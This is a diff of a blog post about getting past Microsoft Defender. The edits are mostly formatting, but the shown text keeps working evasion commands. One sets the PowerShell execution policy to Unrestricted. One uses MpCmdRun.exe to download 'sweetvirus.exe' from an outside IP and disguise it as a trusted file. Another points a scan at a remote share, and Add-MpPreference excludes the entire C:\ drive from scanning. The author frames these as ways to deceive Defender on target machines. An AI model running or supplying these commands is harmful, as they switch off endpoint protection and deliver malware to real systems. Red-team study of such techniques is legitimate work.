@@ -13,7 +13,7 @@ Some days, I would turn to the venerable oracles at VirusTotal and ask them to a
 
 Getting to this point took a lot of experimentation, scouring obscure scrolls of knowledge hidden within online forums, analyzing source code of many great open-source tools and reading what many talented practiotioners have written into articles and tutorials for free, blessing both sides of the infosec community.
 
-### Rules for Finding Successful Bypasses
+## Rules for Finding Successful Bypasses
 
  Almost any guide that details a specific set of steps to take rarely works.  Whoever wrote the guide has done most of the hard work for the AV vendor by proving a map for reverse engineering their executable.  This is possibly one of the main things that anti-virus vendors do - scour the internet for information and add signatures to their databases.  I'd say *especially* if the guide is about "Microsoft Defender Bypasses", as they want to catch what MS Defender doesn't and include that information in their marketing and webinars.
 
@@ -23,11 +23,11 @@ Getting to this point took a lot of experimentation, scouring obscure scrolls of
 
 I had the most success with writing my own tools for obfuscation, or at least modifying semi-obscure ones, followed by using a proprietary tool intended to protect code from being stolen - though it works just as great for casting smoke bombs into enemy workstations.  Since I can't spell out my exact steps for consistent Defender deception, as they'd be useless by the time you read this article, here are some "features, not vulnerabilities" to get to the same destination.
 
-### Execution Policy Bypass
+## Execution Policy Bypass
 
 The first barrier you might hit, especially if you are just grabbing scripts from Github and running them, is the "Execution Policy" settings preventing you from doing what you want. My most used technique is the following:
 
-```
+```ps
 Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
 ```
 
@@ -35,7 +35,7 @@ However, different techniques are blocked on different computers for various rea
 [NetSPI's Bypass Execution POlicy Methods](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
 
 
-### Add-MpPreference
+## Add-MpPreference
 
 This tool is bundled with Defender, so should be present on all Microsoft workstations.  The tool provides a way to run Defender's functions through the command-line or automate workflows by using it in a script.  Interestingly enough, the arguments used to bypass your paylaods from being scanned are not mentioned on the official Microsoft Defender documentation pages for using "Add-MpPreference", only mentioned once on another page without explaining how to do so. 
 
@@ -52,7 +52,7 @@ You can run the executable if Powershell is unavailable.  It is located at `%Pro
 This versatile tool can also download remote files.  When a tool can do so much, its hard to remember all the features, as they also forgot to mention this one as well.
 
 
-```
+```ps
 PS > .\MpCmdRun.exe -DownloadFile -Url http://10.10.10.10/sweetvirus.exe -Path C:\Temp\sweettrustedfile.exe
 ```
 
@@ -60,15 +60,15 @@ Another cool unintended use for the tool, is to trigger a scan on a remote file 
 
 *Shout out to this great guide by snovvcrash for enlightening me* [Github-PPN](https://github.com/snovvcrash/PPN)
 
-```
-Cmd > C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
+```cmd
+C:\ > C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
 ```
 
-### Exclusionary Protection Spells via Powershell
+## Exclusionary Protection Spells via Powershell
 
 To cripple Defender's power reach, you can also set the entire fielsystem as an excluded path.  With a Powershell session running, enter the following commands. 
 
-```
+```powershell
  Add-MpPreference -ExclusionPath "C:\"
  Add-MpPreference -ExclusionProcess "C:\"
 
